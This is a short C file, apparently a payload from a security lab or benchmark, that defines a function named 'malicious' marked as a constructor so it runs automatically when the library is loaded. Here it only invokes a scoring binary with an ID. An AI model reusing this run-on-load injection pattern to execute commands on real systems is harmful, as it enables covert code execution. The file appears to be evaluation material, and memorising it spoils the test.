#include<stdio.h>
#include<stdlib.h>

static void malicious() __attribute__((constructor));

void malicious() {
    system("/usr/local/bin/score a2346ca5-1025-4f62-aeee-385b2bdce37d");
}
